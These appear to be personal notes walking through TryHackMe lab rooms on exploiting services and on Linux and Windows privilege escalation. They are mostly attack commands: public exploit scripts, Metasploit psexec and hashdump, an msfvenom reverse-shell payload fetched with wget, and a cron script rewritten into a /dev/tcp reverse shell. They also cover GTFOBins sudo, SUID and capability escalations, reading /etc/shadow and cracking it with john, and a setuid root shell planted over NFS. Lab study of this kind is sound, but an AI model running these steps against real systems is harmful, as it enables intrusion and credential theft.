# Real-Hack

# Real Hack

- **Q1.Use this exploit against the vulnerable machine. What is the value of the flag located in a web directory?**
    
    -For privilege escalation(tryhackme : exploit vulnerabilities room)
    
    ```bash
    searchsploit online boook store
    searchsploit -m 47887.py      (-m for mirror an exploit to the current working directory )
    ls
    nano 47887.py   ( for checking python script: CVE, Tested on, version, software link, vendor omepage , exploit author, date , exploit title) )
    python3 47887.py http://10.201.15.221
    >Do you wish to launch a shell here (y/n): Y
    RCE: ls
    cat flag.txt
    ```
    

- **Q2 What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.**
    
    question hint: If you are struggling, there is an exploit located on the AttackBox under /usr/share/exploits/vulnerabilitiescapstone
    
    Lab room: tryhackme vulnerability capston
    
    **command terminal 1**
    
    ```bash
    cd /usr/share/exploits/vulnerabilitiescapstone
    ls
    nano exploit.py        (only for check )
    python3 exploit.py 10.201.104.207    ( this is room IP/ Target IP address) )
    ```
    
    **command terminal 2**
    
    ```bash
    nc -nlvp 8081           ( netcat 
    ```
    
    **command terminal 1**
    
    ```bash
    shell_me
    >Enter your attacking machine IP: Port $ 10.201.117.81.8081       ( this is kali IP/ vmware kali ip)
    ```
    
    **command terminal 2**
    
    connection received on 10.201.104.207 57382
    
    ```bash
    ls
    cd /home/ubuntu
    cat flag.txt
    ```
    

- Metasploit
    
    
    ```bash
    use exploit/windows/smb/psexec
    show options
    set rhosts 10.201.52.7
    set smbpass Password1
    set smbuser ballen
    ```
    
    meterpreter:
    
    ```bash
    sysinfo           ( get some answer)
    bg    ( backgrounding session)
    ```
    
    ```bash
    sessions
    use post/windows/gather/enum_shares
    options
    set session 1
    run          ( get some answer )
    ```
    
    ```bash
    sessions -i 1
    meterpreter>
    hashdump          (get answer) or try
    getsystem
    hashdump
    ps
    migrate 768  ( lsass.exe)
    hashdump         ( get simillar answer)
    
    ```
    
    in meterpreter
    
    ```bash
    search -f secrets.txt      ( get answer c:\ ...\secrets.txt)
    search -f realsecret.txt   ( get answer c:\...txt)
    
    cd Windows\ Multimedia \ Platform \\
    ls 
    cat secrets.txt
    
    ```
    
    meterpreter
    
    ```bash
    shell
    type c:\inetpub\wwwroot\realsecret.tx       particular dir
    ---------final answer----
    ```
    
- **What is the other user's password hash?**
    
    **Metasploit: Exploitation**
    
    normal command:
    
    command 1
    
    ```bash
    ssh murhpy@ip
    enter password: 
    clear
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf
    wget http://IP:9000/shel.elf
    ls
    chmod 777 shel.elf
    
    not execute not 
    ./shell.elf
    hit enter
    ```
    
    command 2
    
    msfconsole:msf6
    
    ```bash
    search multi/handler
    use 7
    show options
    set rhosts , port
    
    set payload linux/x86//meterpreter/reverse_tcp
    run 
     and goooooo 1
     
     
     and get the meterperter
     ls
     meterpreter>cat shadow 
                                         and answer lllllllllllllllllllllllllllll
     
    ```
    
    command 3 target machine
    
    ```bash
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf
    
    ls
    chmod 777 shel.elf
    ls
    python3 -m http.server 9000
    ```
    

### **Linux**

- **Privilege Escalation: Sudo(Linux Privilege Escalation)Tryhackme room**
    
    
    ```bash
    ssh karen@10.201.19.41
    password:Password1
    id
    sudo -l            ( NOPASSWD: /usr/bin/**nano
    
    //search in google GTFOBins
    //search : nano
    //and select sudo 
    
    sudo nano
    ^R^X                                   ( ctrl R and ctrl X )
    reset; sh 1>&0 2>&0
    
    id
    ls
    cd ubuntu
    ls
    cat flag2.txt                   ( get the answer........)
    
    cat /etc/shadow                     hash of frank's password?**
    
    ```
    
    ```bash
    
    ```
    
    ```bash
    
    ```
    
- **Privilege Escalation: SUID**
    
    **Linux Privilege Escalation( tryhackme room)**
    
    ```bash
    ssh karen@10.201.60.20
    //yes
    //password: Password1
    find / -type f -perm -04000 -ls 2>/dev/null        (will list files that have SUID or SGID bits set)
    //use GTFOBins get binaries      --/base64
    
    ```
    
    //GTFOBins: SUID(Set-user Identification)
    
    ```bash
    sudo install -m =xs $(which base64) .
    
    LFILE=file_to_read
    ./base64 "$LFILE" | base64 --decode                  
    ```
    
    ```bash
    cat /etc/passwd                                --------user
    cat /etc/shadow         --- permission denied
    LFILE=/etc/shadow
    base64 "$LFILE" | base4 --decode             ------got the permission  , user2
     
    ```
    
    root@kali-/home/kali:::
    
    ```bash
    vim user2.txt           //use user2 hash
    use : enter i and :wq (write and quite the vim)Go back to normal mode → Press Esc
     
    cat user2.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt user2
    john --show user2              -------get the password
    
    ```
    
    ```bash
    find / -name flag3.txt        --- permission denied
    find / -name flag3.txt 2>/dev/null                       ----get the location
    cat /home/ubuntu/flag3.txt       ---permission denied
    FLAG=/home/ubuntu/flag3.txt
    base64 "$FLAG" | base64 --decode          ----wowo this is ths flaggggggg
    ```
    
- **Privilege Escalation: Capabilities**
    
    **Linux Privilege Escalation(tryhackme room)**
    
    What is the content of the flag4.txt file?
    
    ```bash
    ssh karen@10.201.57.245
    password: Password1
    
    ```
    
    new privilege $
    
    ```bash
    id
    getcap -r / 2>/dev/null             //get 6 set of capabilities
    
    ```
    
    //gtfobins>view>Capabilities
    
    ```bash
    cp $(which view) .
    sudo setcap cap_setuid+ep view
    
    ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    ```
    
    ```bash
    /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    
    id             //root user
    ls
    cd /home
    ls
    cd ubuntu
    ls
    cat flag4.txt            //get the flag
    ```
    
- **Privilege Escalation: Cron Jobs
Linux Privilege Escalation(tryhackme room)**
    
    
    ```bash
    ssh karen@10.201.47.253
    yes
    password: Password1
    ```
    
    $
    
    ```bash
    cat /etc/crontab           ---we have 4 crontab
    
    //root antivirun.sh here is no path define
    //root /home/karen/backup.sh where it has home directory
    
    ls -la /home/karen/backup.sh
    
    ```
    
    **new command window
    
    ```bash
    nc -lvp 4545
    ```
    
    $
    
    ```bash
    ls -la /tmp
    cd /home/karen
    nano backup.sh            //remove and set new script
    
    ```
    
    script in nano backup.sh
    
    ```bash
    #! /bin/bash
    bash -i >& /dev/tcp/10.201.84.195/4545 0>&1
    //save it
    ```
    
    $
    
    ```bash
    ls -la
    chmod +x backup.sh
    
    ```
    
    **new command window #
    
    ```bash
    /connected with nc
    id
    cd /home/ubuntu
    ls
    cat flag5.txt
    cat /etc/shadow                 --get the password
    exit                
    
    ```
    
- **Privilege Escalation: PATH**
    
    some problem here llllllllll
    
    ```bash
    ssh karen@10.201.77.63
    yes
    Password1
    ```
    
    $
    
    ```bash
    id
    ls
    cd /home
    cd murdoch
    ls
    file test
    nano thm.py
    echo $PATH
    ls -la /tmp             //our job to creat a binary in tmp dir
    
    cd /tmp
    echo "/bin/bash" > thm
    chmod 777 thm
    ls -la
    cd /home/murdoch
    ls
    ./test
    
    ```
    
    #new shell
    
    ```bash
    id 
    cd matt
    ls
    cat flag6.tx
    ```
    
- **Privilege Escalation: NFS(network file sharing)**
    
    
    ```bash
    ssh karen@10.201.45.88
    yes
    Password1
    
    ```
    
    new command
    
    ```bash
    showmount -e 10.201.45.88
    
    ```
    
    $
    
    ```bash
    cat /etc/exports
    
    ```
    
    new command
    
    ```bash
    sudo -i
    ls
    cd mnt
    ls
    rm -r jrv1
    mkdir jrpentest
    mount -o rw 10.201.45.88:/home/ubuntu/sharedfolder /mnt/jrpentest
    ls
    cd jrpentest
    
    ```
    
    $
    
    ```bash
    ls -la /home/ubuntu/sharedfolder           //don't have write permission
    
    ls -la /home/
    id
    
    ```
    
    new command
    
    ```bash
    nano code.c
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    int main (void) {
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
        return 0;
    }
    
    cat code.c
    gcc code.c -o code
    chmod +x code
    chmod +s code
    
    ```
    
    $
    
    ```bash
    ls
    cd ubuntu
    ls
    cd sharedfolder
    ./code
    
    ```
    
    #
    
    ```bash
    id           // root user
    cd ..
    cd matt
    ls
    cd flag7.txt
    ```
    
- **Capstone Challenge**
    
    **Linux Privilege Escalation(tryhackme room)**
    
    ```bash
    ssh leonard@10.201.1.159
    yes
    Password: Penny123
    ```
    
    $
    
    ```bash
    find / -type f -perm -04000 -ls 2>/dev/null          (serch for binaries)
    //gtfobins>>base64>>suid
    
    LFILE=file_to_read
    ./base64 "$LFILE" | base64 --decode
    ```
    
    $
    
    ```bash
    LFILE=/etc/shadow
    /usr/bin/base64 "$LFILE" | base64 --decode
    
    ////get the hash of missy and use john to crack this
    
    ```
    
    new command
    
    ```bash
    ls
    john missy --show
    ```
    
    switch to missy using su
    
    ```bash
    su missy 
    //Password: Password1
    cd ..
    ls
    cd missy
    cd Documents
    ls
    cat flag1.txt
    
    ```
    
    ```bash
    LFILE=/home/rootflag/flag2.txt
    /usr/bin/base64 "$LFILE" | base64 --decode
    
    ................wowoww got it............
    ```
    

### **Windows Privilege Escalation**

   Tryhackme room

- **Harvesting Passwords from Usual Spots**
    
    windows
    
    ```bash
    cmd
    net userse
    systeminfo                      //os version is vita'
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    
    runas /savecred /user:mike.katz cmd.exe
    //new windows terminal 
    cd ..
    cd ..
    cd Users
    cd mike.katz
    cd Desktop
    type flag.txt
    ```
    
    ```bash
    
    ```
    
    ```bash
    
    ```
    

- **Socket Programming**
    
    
    Open kali: 1>subl scanner.py
    
    1. use code
    2. python3 scanner.py
    
    ```python
    #!/usr/bin/python3       # shebang line
    
    import socket
    
    target_host = input("Enter Your IP: ")    # Target IP
    target_ports = range(1, 1025)             # Target ports
    
    print(f"Scanning {target_host}...\n")
    
    for port in target_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket
        sock.settimeout(0.5)  # half-second timeout
    
        result = sock.connect_ex((target_host, port))
    
        if result == 0:  # 0 means the port is open
            print(f"Port {port} is open")
    
        sock.close()
    
    ```
    
- [**https://www.revshells.com/**](https://www.revshells.com/)
